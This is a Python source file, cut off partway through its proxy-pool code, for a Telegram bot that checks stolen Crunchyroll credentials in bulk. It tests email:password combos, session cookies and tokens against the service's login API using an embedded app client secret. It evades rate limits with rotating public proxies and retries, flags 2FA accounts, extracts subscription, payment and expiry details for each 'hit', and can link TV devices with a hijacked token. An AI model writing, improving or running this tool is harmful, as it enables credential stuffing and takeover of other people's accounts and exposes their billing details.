#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CrunchyrollChecker — UNIFIED PREMIUM BOT (v10 — BlazeNXT)
====================================================================
All legacy checkers merged into one, button-driven Telegram bot:

  • CrunchyCLI.py            → email:pass account checks
  • cc2.py                   → Oxaam auto-extract, TV activation
  • crunchy_premium_bot_v8   → bot core: access codes, proxies, checker
  • Baron app-API checker    → Android TV app flow (the one that HITS):
        login via Crunchyroll/ANDROIDTV app UA, premium gate on
        subs/v1 benefits (concurrent_streams), plan Fan/Mega/Ultimate,
        subs/v3 expiry/sku/auto_renew, subs/v4 price/cycle/trial,
        429 rate-limit short-circuit + retry, per-combo proxy rotation

v10 PREMIUM — BlazeNXT
  • 100% button flow, Bot API 9.4 colored buttons:
        style "primary" (blue) / "success" (green) / "danger" (red)
        + icon_custom_emoji_id — with automatic plain fallback
  • BlazeNXT live scan card:
        📈 CRUNCHYROLL Scan — Live  |  ▓▓▓░░ 63% [████████████░░░░] (30/47)
        • Checked  • ⭐ Hits | 💎 Free | 🔐 2FA | ❌ Bad | ⚠️ Errors
        📈 CPM  🕒 Elapsed  ⏳ ETA  |  📡 Live feed (last 3 emails)
  • Premium dashboard (clean, no AIO grid — Crunchyroll only) — BlazeNXT
  • ⭐ Full HIT card on every hit (email, password, plan, expiry,
        days left, auto renew, trial, duration, price, country flag…)
  • Proxy pool: paste proxies in chat → saved to disk, background
        auto-checked (auto-check toggle), clear-pool button
  • App-API checker with proxy→direct fallback per request (no more stuck)

Deploy: Railway (see README) — railway.json + Procfile + requirements.txt
Run:    BOT_TOKEN=... OWNER_ID=... python bot.py
"""

import os
import re
import sys
import csv
import json
import time
import base64
import random
import asyncio
import logging
import tempfile
import threading
import requests
import uuid
from pathlib import Path
from typing import Dict, List, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta, timezone

try:
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print("[!] pip3 install requests")
    sys.exit(1)

try:
    from telegram import Update, InputFile, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
    from telegram.constants import ParseMode
    from telegram.error import BadRequest, RetryAfter  # FloodWait in older PTB
    from telegram.ext import (
        Application,
        CommandHandler,
        MessageHandler,
        CallbackQueryHandler,
        ContextTypes,
        filters,
    )
except ImportError:
    print("[!] pip3 install python-telegram-bot==22.8")
    sys.exit(1)

try:
    from bs4 import BeautifulSoup
except ImportError:
    BeautifulSoup = None  # oxaam parsing falls back to regex-only

try:
    import socks  # noqa: F401  (PySocks — enables SOCKS5 proxy support)
    SOCKS5_OK = True
except ImportError:
    SOCKS5_OK = False

# Mini App removed — Crunchyroll single checker only

# ===================== CONFIG (env-driven) =====================
def _load_dotenv() -> None:
    """Minimal .env loader (no extra dependency).

    Real environment variables (e.g. the ones set in the Railway Variables tab)
    always win — .env only fills in what is not set yet.
    """
    env_path = Path(__file__).resolve().parent / ".env"
    if not env_path.exists():
        return
    try:
        for line in env_path.read_text(encoding="utf-8").splitlines():
            line = line.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            key, _, val = line.partition("=")
            key = key.strip()
            val = val.strip().strip("'\"")
            if key and key not in os.environ:
                os.environ[key] = val
    except OSError:
        pass

def _env(name: str, default: str = "") -> str:
    v = os.getenv(name)
    if v is None or str(v).strip() == "":
        return default
    return str(v).strip()

_load_dotenv()

BOT_TOKEN = _env("BOT_TOKEN")
try:
    OWNER_ID = int(_env("OWNER_ID", "0") or 0)
except ValueError:
    OWNER_ID = 0
OWNER_USERNAME = _env("OWNER_USERNAME", "@unknown")
# Multiple admins: OWNER_IDS (comma-separated) + ADMIN_USERNAMES (comma-separated, with or without @)
_raw_ids = _env("OWNER_IDS", "") or _env("ADMIN_IDS", "")
ADMIN_IDS = set()
if _raw_ids:
    for _x in _raw_ids.split(","):
        _x=_x.strip()
        if _x.isdigit():
            try:
                ADMIN_IDS.add(int(_x))
            except: pass
if OWNER_ID:
    ADMIN_IDS.add(OWNER_ID)
# Admin usernames (lowercase, without @)
_raw_un = _env("ADMIN_USERNAMES", "") or _env("ADMIN_USERNAME", "")
ADMIN_USERNAMES = set()
if _raw_un:
    for _u in _raw_un.split(","):
        _u=_u.strip().lstrip("@").lower()
        if _u:
            ADMIN_USERNAMES.add(_u)
if OWNER_USERNAME and OWNER_USERNAME.lstrip("@"):
    ADMIN_USERNAMES.add(OWNER_USERNAME.lstrip("@").lower())

def is_admin(uid: int, username: str = None) -> bool:
    if uid in ADMIN_IDS:
        return True
    if username:
        un = str(username).lstrip("@").lower()
        if un in ADMIN_USERNAMES:
            return True
    return False

DATA_DIR = Path("data")
DATA_DIR.mkdir(parents=True, exist_ok=True)

# === BOT-ONLY CONFIG — env me bas BOT_TOKEN + OWNER_ID, baki sab bot se ===
PORT = int(_env("PORT", "8000") or 8000)  # Railway PORT only

THREADS = 120  # default 120, bot se 300 tak change kar sakte ho (Tools → Set Threads)
PROXY_REFRESH_MINUTES = 15
MAX_PROXIES_TO_KEEP = 80
PROXY_TEST_TIMEOUT = 6  # faster for 500-600 cpm
PROXY_TEST_SAMPLE = 250
CHECK_TIMEOUT = 15
MAX_FILE_MB = 20  # Telegram Bot API download limit
PREMIUM_ONLY_DEFAULT = True
MAX_PASTED_CREDS = 2000
MAX_PASTED_PROXIES = 5000
MAX_THREADS_USER = 300  # max threads user can set (like RESIROX max 300)
MAX_HIT_CARDS = 150  # per-hit detail cards per check (rest goes to the export file)

START_TIME = time.time()
CHECKS_DONE = 0
CHECKS_LOCK = threading.Lock()

def bump_checks(n: int) -> None:
    global CHECKS_DONE
    with CHECKS_LOCK:
        CHECKS_DONE += n

def uptime() -> str:
    s = int(time.time() - START_TIME)
    d, r = divmod(s, 86400)
    h, r = divmod(r, 3600)
    m, sec = divmod(r, 60)
    parts = []
    if d:
        parts.append(f"{d}d")
    if h:
        parts.append(f"{h}h")
    parts.append(f"{m}m {sec}s")
    return " ".join(parts)

def _fmt_duration(sec: float) -> str:
    """Format seconds as '1m 10s' or '192m 18s' like BlazeNXT."""
    sec = int(sec)
    if sec < 0:
        sec = 0
    m, s = divmod(sec, 60)
    h, m = divmod(m, 60)
    if h:
        return f"{h}h {m}m {s}s"
    return f"{m}m {s}s"

def _fmt_cpm(processed: int, elapsed: float) -> int:
    if elapsed <= 0 or processed <= 0:
        return 0
    return int(processed / elapsed * 60)

def _fmt_eta(total: int, processed: int, cpm: int) -> str:
    if cpm <= 0 or total <= processed:
        return "—"
    remaining = total - processed
    eta_sec = int(remaining * 60 / cpm)
    return _fmt_duration(eta_sec)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)],
)
logger = logging.getLogger("CrunchyBot")

# ===================== SMALL HELPERS =====================
def esc(v) -> str:
    """HTML-escape for safe Telegram HTML messages."""
    if v is None or v == "":
        return "N/A"
    return str(v).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

def now_utc() -> datetime:
    return datetime.now(timezone.utc)

def parse_iso(s) -> Optional[datetime]:
    if not s:
        return None
    try:
        dt = datetime.fromisoformat(str(s).replace("Z", "+00:00"))
        if dt.tzinfo is None:
            dt = dt.replace(tzinfo=timezone.utc)
        return dt
    except (ValueError, TypeError):
        return None

def fmt_dt(dt: Optional[datetime]) -> str:
    if not dt:
        return "N/A"
    return dt.astimezone(timezone.utc).strftime("%d-%m-%Y %H:%M UTC")

def days_left_until(iso_date: str) -> str:
    if not iso_date:
        return "N/A"
    dt = parse_iso(iso_date)
    if not dt:
        return "N/A"
    return str(max(0, (dt - now_utc()).days))

def generate_code() -> str:
    chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
    return "".join(random.choice(chars) for _ in range(12))

def _clean_err(e) -> str:
    """Collapse newlines/whitespace from exception strings for tidy output."""
    return " ".join(str(e).split())[:60]

def flag_emoji(cc) -> str:
    """Country code -> flag emoji (IN -> 🇮)."""
    cc = (cc or "").upper().strip()
    if len(cc) != 2 or not cc.isalpha():
        return ""
    return "".join(chr(0x1F1E6 + ord(c) - 65) for c in cc)

# ===================== CRUNCHYROLL API =====================
API_HOST = "https://beta-api.crunchyroll.com"
# Public web-SSO client id/secret (same as the official client, used by all legacy tools)
CLIENT_ID = "rjs0ltx0dbwkliwxdzdf"
CLIENT_SECRET = "4V7rf21-UFXeZ-5XAd0X_QPwr1gu_i1s"

# App (Android TV) flow — the "Baron" flow that hits valid accounts
APP_UA = "Crunchyroll/ANDROIDTV/3.65.0_22347 (Android 10; en-US; sdk_google_atv_x86)"
APP_DEVICE_TYPE = "Google SDK built for x86"
APP_DEVICE_NAME = "sdk_google_atv_x86"
BARO_WUA = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
            "(KHTML, like Gecko) SamsungBrowser/28.0 Chrome/130.0.0.0 Mobile Safari/537.36")
PLAN_BY_STREAMS = {"1": "Fan", "4": "Mega Fan", "6": "Ultimate Fan"}
BILLING_MAP = {"P1D": "Daily", "P1W": "Weekly", "P1M": "Monthly", "P3M": "3 Months", "P1Y": "Annual"}

COUNTRY_MAP = {
    "AF": "Afghanistan", "AL": "Albania", "DZ": "Algeria", "AD": "Andorra",
    "AO": "Angola", "AG": "Antigua and Barbuda", "AR": "Argentina", "AM": "Armenia",
    "AU": "Australia", "AT": "Austria", "AZ": "Azerbaijan", "BS": "Bahamas",
    "BH": "Bahrain", "BD": "Bangladesh", "BB": "Barbados", "BY": "Belarus",
    "BE": "Belgium", "BZ": "Belize", "BJ": "Benin", "BT": "Bhutan",
    "BO": "Bolivia", "BA": "Bosnia and Herzegovin", "BW": "Botswana", "BR": "Brazil",
    "BN": "Brunei", "BG": "Bulgaria", "BF": "Burkina Faso", "BI": "Burundi",
    "KH": "Cambodia", "CM": "Cameroon", "CA": "Canada", "CV": "Cape Verde",
    "CF": "Central African Republic", "TD": "Chad", "CL": "Chile", "CN": "China",
    "CO": "Colombia", "KM": "Comoros", "CG": "Congo", "CD": "DR Congo",
    "CR": "Costa Rica", "CI": "Cote d'Ivoire", "HR": "Croatia", "CU": "Cuba",
    "CW": "Curacao", "CY": "Cyprus", "CZ": "Czech Republic", "DK": "Denmark",
    "DJ": "Djibouti", "DM": "Dominica", "DO": "Dominican Republic", "EC": "Ecuador",
    "EG": "Egypt", "SV": "El Salvador", "GQ": "Equatorial Guinea", "ER": "Eritrea",
    "EE": "Estonia", "ET": "Ethiopia", "FJ": "Fiji", "FI": "Finland",
    "FR": "France", "GA": "Gabon", "GM": "Gambia", "GE": "Georgia",
    "DE": "Germany", "GH": "Ghana", "GR": "Greece", "GD": "Grenada",
    "GT": "Guatemala", "GN": "Guinea", "GW": "Guinea-Bissau", "GY": "Guyana",
    "HT": "Haiti", "HN": "Honduras", "HK": "Hong Kong", "HU": "Hungary",
    "IS": "Iceland", "IN": "India", "ID": "Indonesia", "IR": "Iran",
    "IQ": "Iraq", "IE": "Ireland", "IL": "Israel", "IT": "Italy",
    "JM": "Jamaica", "JP": "Japan", "JO": "Jordan", "KZ": "Kazakhstan",
    "KE": "Kenya", "KI": "Kiribati", "KP": "North Korea", "KR": "South Korea",
    "KW": "Kuwait", "KG": "Kyrgyzstan", "LA": "Laos", "LV": "Latvia",
    "LB": "Lebanon", "LS": "Lesotho", "LR": "Liberia", "LY": "Libya",
    "LI": "Liechtenstein", "LT": "Lithuania", "LU": "Luxembourg", "MO": "Macao",
    "MK": "North Macedonia", "MG": "Madagascar", "MW": "Malawi", "MY": "Malaysia",
    "MV": "Maldives", "ML": "Mali", "MT": "Malta", "MH": "Marshall Islands",
    "MR": "Mauritania", "MU": "Mauritius", "MX": "Mexico", "FM": "Micronesia",
    "MD": "Moldova", "MC": "Monaco", "MN": "Mongolia", "ME": "Montenegro",
    "MA": "Morocco", "MZ": "Mozambique", "MM": "Myanmar", "NA": "Namibia",
    "NR": "Nauru", "NP": "Nepal", "NL": "Netherlands", "NZ": "New Zealand",
    "NI": "Nicaragua", "NE": "Niger", "NG": "Nigeria", "NO": "Norway",
    "OM": "Oman", "PK": "Pakistan", "PW": "Palau", "PS": "Palestine",
    "PA": "Panama", "PG": "Papua New Guinea", "PY": "Paraguay", "PE": "Peru",
    "PH": "Philippines", "PL": "Poland", "PT": "Portugal", "PR": "Puerto Rico",
    "QA": "Qatar", "RO": "Romania", "RU": "Russia", "RW": "Rwanda",
    "SA": "Saudi Arabia", "SN": "Senegal", "RS": "Serbia", "SC": "Seychelles",
    "SL": "Sierra Leone", "SG": "Singapore", "SK": "Slovakia", "SI": "Slovenia",
    "SB": "Solomon Islands", "SO": "Somalia", "ZA": "South Africa", "SS": "South Sudan",
    "ES": "Spain", "LK": "Sri Lanka", "SD": "Sudan", "SR": "Suriname",
    "SZ": "Eswatini", "SE": "Sweden", "CH": "Switzerland", "SY": "Syria",
    "TW": "Taiwan", "TJ": "Tajikistan", "TZ": "Tanzania", "TH": "Thailand",
    "TL": "Timor-Leste", "TG": "Togo", "TO": "Tonga", "TT": "Trinidad and Tobago",
    "TN": "Tunisia", "TR": "Turkey", "TM": "Turkmenistan", "TV": "Tuvalu",
    "UG": "Uganda", "UA": "Ukraine", "AE": "UAE", "GB": "United Kingdom",
    "US": "United States", "UY": "Uruguay", "UZ": "Uzbekistan", "VU": "Vanuatu",
    "VE": "Venezuela", "VN": "Vietnam", "YE": "Yemen", "ZM": "Zambia",
    "ZW": "Zimbabwe",
}

_tls = threading.local()

def get_session() -> requests.Session:
    """Thread-local session with sane connection pooling."""
    s = getattr(_tls, "s", None)
    if s is None:
        s = requests.Session()
        s.mount("https://", HTTPAdapter(pool_connections=20, pool_maxsize=20))
        s.mount("http://", HTTPAdapter(pool_connections=20, pool_maxsize=20))
        _tls.s = s
    return s

def _req(session, method, url, proxy, **kw):
    """Request with proxy -> direct fallback (dead proxy must never kill a check)."""
    try:
        return session.request(method, url, proxies=proxy, timeout=CHECK_TIMEOUT, **kw)
    except requests.RequestException:
        if proxy:
            return session.request(method, url, timeout=CHECK_TIMEOUT, **kw)
        raise

def _blank_data(user: str) -> dict:
    return {
        "user": user.split("@")[0] if user else "", "verified": False,
        "plan": "", "sku": "", "streams": "", "expiry": "", "days_left": "N/A",
        "renew": False, "trial": False, "duration": "", "price": "",
        "currency": "", "plan_type": "", "created": "", "payment": "",
        "cc": "", "country_name": "", "info": "",
        # Detailed checker fields
        "account_id": "", "external_id": "", "sub_id": "", "sub_status": "",
        "next_renewal": "", "start_date": "", "billing_cycle": "",
        "payment_method": "", "benefits": "", "checked_at": "",
        "proxy_used": "", "response_time": "",
    }

# ---------------- App-API login (Baron flow) ----------------
def app_login(user: str, pw: str, proxy: Optional[dict] = None):
    """Android TV password-grant login. Returns (token_json|None, st)."""
    s = get_session()
    try:
        r = _req(s, "POST", f"{API_HOST}/auth/v1/token", proxy, data={
            "grant_type": "password",
            "username": user, "password": pw,
            "scope": "offline_access",
            "client_id": CLIENT_ID, "client_secret": CLIENT_SECRET,
            "device_type": APP_DEVICE_TYPE,
            "device_id": str(uuid.uuid4()),
            "device_name": APP_DEVICE_NAME,
        }, headers={
            "User-Agent": APP_UA,
            "Accept": "application/json",
            "Accept-Charset": "UTF-8",
            "Accept-Encoding": "gzip",
            "Connection": "Keep-Alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "ETP-Anonymous-ID": str(uuid.uuid4()),
            "Request-Type": "SignIn",
        })
    except requests.RequestException as e:
        return None, f"network: {_clean_err(e)}"
    src = r.text or ""
    low = src.lower()
    if r.status_code == 429 or "too_many_requests" in src or "rate limited" in low:
        return None, "rate"
    # 2FA / MFA detection (counts as distinct bucket in premium UI)
    if any(x in low for x in ("two_factor", "2fa", "mfa_required", "otp_required", "otp_code", "verification_required")):
        return None, "2fa"
    if "invalid_grant" in src or "invalid_credentials" in src or r.status_code in (400, 401):
        return None, "bad"
    try:
        j = r.json()
    except ValueError:
        return None, f"json fail ({r.status_code})"
    if r.status_code != 200 or not isinstance(j, dict) or not j.get("access_token"):
        return None, "no token"
    return j, "ok"

# ---------------- App-API account check (the HITTER) ----------------
def check_account_app(user: str, pw: str, proxy: Optional[dict] = None):
    """Baron app-API flow. Returns (st, data): st in hit/free/bad/rate/err."""
    d = _blank_data(user)
    j, st = app_login(user, pw, proxy)
    if j is None:
        if st == "bad":
            return "bad", d
        if st == "rate":
            return "rate", d
        if st == "2fa":
            return "2fa", d
        return "err", d
    tk = j["access_token"]
    hdr = {
        "Authorization": f"Bearer {tk}",
        "User-Agent": BARO_WUA,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
    }
    s = get_session()

    # multiprofile -> display name
    try:
        r = _req(s, "GET", f"{API_HOST}/accounts/v1/me/multiprofile", proxy, headers=hdr)
        mp = r.json()
        if isinstance(mp, dict):
            profiles = mp.get("profiles") or []
            primary = next((p for p in profiles if p.get("is_primary")), None)
            if not primary and profiles:
                primary = profiles[0]
            if primary and primary.get("profile_name"):
                d["user"] = primary["profile_name"]
    except (requests.RequestException, ValueError):
        pass

    # /me -> ids + verified
    me = {}
    try:
        r = _req(s, "GET", f"{API_HOST}/accounts/v1/me", proxy, headers=hdr)
        me = r.json()
    except (requests.RequestException, ValueError):
        pass
    if isinstance(me, dict):
        d["verified"] = bool(me.get("email_verified"))
        if me.get("username") and d["user"] == (user.split("@")[0] if user else ""):
            d["user"] = me["username"]
    ext = me.get("external_id", "") if isinstance(me, dict) else ""
    acc = me.get("account_id", "") if isinstance(me, dict) else ""
    if not ext:
        return "free", d

    # benefits v1 — the premium gate (Baron logic)
    try:
        r = _req(s, "GET", f"{API_HOST}/subs/v1/subscriptions/{ext}/benefits", proxy, headers=hdr)
        bsrc = r.text if r.status_code == 200 else ""
    except requests.RequestException:
        bsrc = ""
    if not bsrc or any(x in bsrc for x in (
        "subscription.not_found", "Subscription Not Found",
        '"total":0', '"subscription_country":""',
    )) or "concurrent_streams" not in bsrc:
        return "free", d

    # Detailed: store ids
    d["account_id"] = acc or ""
    d["external_id"] = ext or ""
    d["benefits"] = bsrc[:500] if bsrc else ""
    # HIT
    m = re.search(r'"concurrent_streams\.(\d+)"', bsrc)
    if m:
        d["streams"] = m.group(1)
        d["plan"] = PLAN_BY_STREAMS.get(m.group(1), f"Plan {m.group(1)}")
    m = re.search(r'"subscription_country"\s*:\s*"([^"]+)"', bsrc)
    if m:
        d["cc"] = m.group(1)
        d["country_name"] = COUNTRY_MAP.get(d["cc"], d["cc"])
    m = re.search(r'"source"\s*:\s*"([^"]+)"', bsrc)
    if m:
        d["payment"] = m.group(1)
        d["payment_method"] = m.group(1)

    # subs v3 — expiry / sku / auto renew
    if acc:
        try:
            r = _req(s, "GET", f"{API_HOST}/subs/v3/subscriptions/{acc}", proxy, headers=hdr)
            s3 = r.text or ""
            m = re.search(r'"expiration_date"\s*:\s*"([^T"]+)', s3)
            if m:
                d["expiry"] = m.group(1)
                d["days_left"] = days_left_until(m.group(1))
            m = re.search(r'"auto_renew"\s*:\s*(true|false)', s3)
            if m:
                d["renew"] = m.group(1) == "true"
            m = re.search(r'"sku"\s*:\s*"([^"]+)"', s3)
            if m:
                d["sku"] = m.group(1)
            # detailed
            m = re.search(r'"subscription_id"\s*:\s*"([^"]+)"', s3)
            if m:
                d["sub_id"] = m.group(1)
            m = re.search(r'"status"\s*:\s*"([^"]+)"', s3)
            if m:
                d["sub_status"] = m.group(1)
        except requests.RequestException:
            pass

    # subs v4 — price / cycle / trial / plan type / created (rich card)
    if acc:
        try:
            r = _req(s, "GET", f"{API_HOST}/subs/v4/accounts/{acc}/subscriptions", proxy, headers=hdr)
            v4 = r.json()
            if isinstance(v4, dict):
                subs4 = v4.get("subscriptions") or []
                sub4 = subs4[0] if subs4 else {}
                plan4 = sub4.get("plan") or {}
                price4 = plan4.get("price") or {}
                if sub4.get("nextRenewalDate") and not d["expiry"]:
                    d["expiry"] = sub4["nextRenewalDate"][:10]
                    d["days_left"] = days_left_until(sub4["nextRenewalDate"])
                if sub4.get("startDate"):
                    d["created"] = sub4["startDate"][:10]
                d["trial"] = bool(plan4.get("activeFreeTrial"))
                if plan4.get("planType"):
                    d["plan_type"] = plan4["planType"]
                cyc = price4.get("cycleDuration") or ""
                if cyc:
                    d["duration"] = BILLING_MAP.get(cyc, cyc)
                if price4.get("amount") is not None:
                    d["price"] = str(price4["amount"])
                    d["currency"] = price4.get("currencyCode", "")
                # detailed billing
                d["billing_cycle"] = price4.get("cycleDuration") or d.get("duration", "")
                d["next_renewal"] = sub4.get("nextRenewalDate", "")[:10] if sub4.get("nextRenewalDate") else d.get("expiry", "")
                d["start_date"] = sub4.get("startDate", "")[:10] if sub4.get("startDate") else d.get("created", "")
                d["sub_status"] = sub4.get("status", "") or d.get("sub_status", "")
                d["sub_id"] = sub4.get("subscriptionId", "") or sub4.get("id", "") or d.get("sub_id", "")
                pay = v4.get("currentPaymentMethod") or {}
                if pay.get("name") and not d["payment"]:
                    d["payment"] = pay["name"]
                d["payment_method"] = pay.get("name", "") or d.get("payment", "")
        except (requests.RequestException, ValueError):
            pass
    return "hit", d

def check_account_app_retry(user: str, pw: str, proxy: Optional[dict] = None, tries: int = 2):
    """Baron-style rate-limit retry: short backoff, then give up as 'rate'."""
    st, d = check_account_app(user, pw, proxy)
    i = 0
    while st == "rate" and i < tries:
        time.sleep(4 + random.random() * 3)
        st, d = check_account_app(user, pw, proxy)
        i += 1
    return st, d

# ---------------- Token / cookie checks (web flow) ----------------
def etp_rt_to_token(etp_rt: str, proxy: Optional[dict] = None):
    s = get_session()
    data = {
        "grant_type": "etp_rt_cookie",
        "device_id": str(uuid.uuid4()),
        "device_type": "Firefox on Windows",
    }
    headers = {
        "User-Agent": BARO_WUA,
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json",
        "Origin": "https://www.crunchyroll.com",
        "Referer": "https://www.crunchyroll.com/",
    }
    try:
        r = s.post(
            f"{API_HOST}/auth/v1/token", data=data, headers=headers,
            cookies={"etp_rt": etp_rt}, timeout=CHECK_TIMEOUT, proxies=proxy,
        )
    except requests.RequestException as e:
        return None, f"network: {_clean_err(e)}"
    try:
        j = r.json()
    except ValueError:
        return None, f"http_{r.status_code}"
    if r.status_code != 200 or not isinstance(j, dict) or "access_token" not in j:
        return None, (j or {}).get("error") or (j or {}).get("code") or f"http_{r.status_code}"
    return j, ""

def cr_me(bearer: str, proxy: Optional[dict] = None):
    s = get_session()
    try:
        r = s.get(f"{API_HOST}/accounts/v1/me",
                  headers={"Authorization": f"Bearer {bearer}", "User-Agent": BARO_WUA},
                  timeout=CHECK_TIMEOUT, proxies=proxy)
    except requests.RequestException as e:
        return None, f"network: {_clean_err(e)}"
    if r.status_code in (401, 403):
        return None, f"http_{r.status_code}"
    if r.status_code != 200:
        return None, f"http_{r.status_code}"
    try:
        return r.json(), ""
    except ValueError:
        return None, "bad_json"

def cr_subscriptions(account_id, bearer: str, proxy: Optional[dict] = None):
    if not account_id:
        return None
    s = get_session()
    try:
        r = s.get(f"{API_HOST}/subs/v4/accounts/{account_id}/subscriptions",
                  headers={"Authorization": f"Bearer {bearer}", "User-Agent": BARO_WUA},
                  timeout=CHECK_TIMEOUT, proxies=proxy)
    except requests.RequestException:
        return None
    if r.status_code != 200:
        return None
    try:
        return r.json()
    except ValueError:
        return None

def cr_profiles(bearer: str, proxy: Optional[dict] = None):
    s = get_session()
    try:
        r = s.get(f"{API_HOST}/accounts/v1/me/multiprofile",
                  headers={"Authorization": f"Bearer {bearer}", "User-Agent": BARO_WUA},
                  timeout=CHECK_TIMEOUT, proxies=proxy)
    except requests.RequestException:
        return None
    if r.status_code != 200:
        return None
    try:
        return r.json()
    except ValueError:
        return None

def is_token_expired(token: str) -> bool:
    """Cheap local JWT expiry check (saves API calls)."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return False
        payload = parts[1] + "=" * (-len(parts[1]) % 4)
        data = json.loads(base64.urlsafe_b64decode(payload))
        exp = data.get("exp")
        return bool(exp and int(exp) < time.time())
    except Exception:
        return False

def check_token_or_cookie(bearer: str, proxy: Optional[dict] = None):
    """Web-flow check from an access token. Returns (st, data)."""
    me_data, merr = cr_me(bearer, proxy)
    if not me_data:
        return "err", dict(_blank_data(""), info=merr or "me_failed")
    acc = me_data.get("account_id")
    sub_data = cr_subscriptions(acc, bearer, proxy)
    prof_data = cr_profiles(bearer, proxy)

    subs = (sub_data or {}).get("subscriptions") or []
    active = next((x for x in subs if str(x.get("status", "")).lower() == "active"), None)
    premium = active is not None
    if not premium and me_data.get("external_id"):
        try:
            s = get_session()
            r = _req(s, "GET",
                     f"{API_HOST}/subs/v1/subscriptions/{me_data['external_id']}/benefits",
                     proxy,
                     headers={"Authorization": f"Bearer {bearer}", "User-Agent": BARO_WUA})
            if r.status_code == 200 and "concurrent_streams" in (r.text or ""):
                premium = True
        except requests.RequestException:
            pass

    d = _blank_data(me_data.get("email") or "")
    d["user"] = me_data.get("email") or me_data.get("username") or d["user"]
    d["verified"] = bool(me_data.get("email_verified"))
    profiles = (prof_data or {}).get("profiles") or []
    primary = next((p for p in profiles if p.get("is_primary")), None)
    if primary and primary.get("profile_name"):
        d["user"] = primary["profile_name"]
    if active:
        plan = active.get("plan") or {}
        price = plan.get("price") or {}
        d["plan"] = (plan.get("tier") or {}).get("text") or active.get("sku") or "Premium"
        for b in plan.get("benefits") or []:
            nm = str(b.get("name", "")) if isinstance(b, dict) else ""
            if nm.startswith("concurrent_streams"):
                m = re.search(r"(\d+)$", nm)
                if m:
                    d["streams"] = m.group(1)
                break
        d["cc"] = plan.get("countryCode") or ""
        d["country_name"] = COUNTRY_MAP.get(d["cc"], d["cc"])
        cyc = price.get("cycleDuration") or ""
        d["duration"] = BILLING_MAP.get(cyc, cyc)
        d["currency"] = price.get("currencyCode") or ""
        d["price"] = str(price.get("amount", ""))
        d["trial"] = bool(plan.get("activeFreeTrial"))
        d["plan_type"] = plan.get("planType") or ""
        d["expiry"] = (active.get("nextRenewalDate") or "")[:10]
        d["days_left"] = days_left_until(active.get("nextRenewalDate") or "")
        d["created"] = (active.get("startDate") or "")[:10]
        d["renew"] = active.get("subscriptionQualifier") == "RECURRING"
        pay = (sub_data or {}).get("currentPaymentMethod") or {}
        d["payment"] = pay.get("name") or ""
    return ("hit" if premium else "free"), d

def check_credential(cred: dict, proxy: Optional[dict] = None) -> dict:
    """Check one credential of any type. Returns {"st": hit/free/bad/rate/err/2fa, "data": {...}}."""
    t = cred.get("type")
    try:
        if t == "email":
            st, d = check_account_app_retry(cred["value"], cred.get("password", ""), proxy)
            return {"st": st, "data": d}
        if t == "cookie":
            j, err = etp_rt_to_token(cred["value"], proxy)
            if not j:
                return {"st": "err", "data": dict(_blank_data(""), info=err)}
            st, d = check_token_or_cookie(j["access_token"], proxy)
            return {"st": st, "data": d}
        if t == "token":
            if is_token_expired(cred["value"]):
                return {"st": "err", "data": dict(_blank_data(""), info="expired token")}
            st, d = check_token_or_cookie(cred["value"], proxy)
            return {"st": st, "data": d}
    except Exception as e:  # one bad cred must never kill the run
        return {"st": "err", "data": dict(_blank_data(""), info=_clean_err(e))}
    return {"st": "err", "data": dict(_blank_data(""), info="unknown_type")}

def activate_tv(bearer: str, code: str):
    """TV device activation (the cc2.py flow). Tries both API hosts."""
    s = get_session()
    last_err = "no_hosts_tried"
    for base in (API_HOST, "https://www.crunchyroll.com"):
        try:
            r = s.post(
                f"{base}/auth/v1/device",
                json={"user_code": code},
                headers={
                    "Authorization": f"Bearer {bearer}",
                    "User-Agent": BARO_WUA,
                    "Content-Type": "application/json",
                },
                timeout=20,
            )
            if r.status_code == 200:
                return True, ""
            last_err = f"http_{r.status_code}"
            try:
                j = r.json()
                if isinstance(j, dict) and j.get("code"):
                    last_err = str(j["code"])
            except ValueError:
                pass
        except requests.RequestException as e:
            last_err = f"network: {_clean_err(e)}"
    return False, last_err

# ===================== PROXY POOL =====================
PROXY_SOURCES = [
    "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt",
    "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks5/data.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/VPSLabCloud/VPSLab-Free-Proxy-List/main/http_all.txt",
    "https://raw.githubusercontent.com/VPSLabCloud/VPSLab-Free-Proxy-List/main/socks5_all.txt",
    "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://www.proxy-list.download/api/v1/get?type=socks5",
]
PROXY_TEST_URLS = [
    "https://httpbin.org/ip",
    "https://api.ipify.org?format=json",
    "https://www.google.com/generate_204",
]

LIVE_PROXIES: List[dict] = []
PROXY_LOCK = threading.Lock()
_refresh_busy = threading.Lock()
LAST_PROXY_HARVEST = 0.0
POOL_FILE = DATA_DIR / "proxies_pool.txt"

def proxy_count() -> int:
    with PROXY_LOCK:
        return len(LIVE_PROXIES)

def get_random_proxy() -> Optional[dict]:
    with PROXY_LOCK:
        if LIVE_PROXIES:
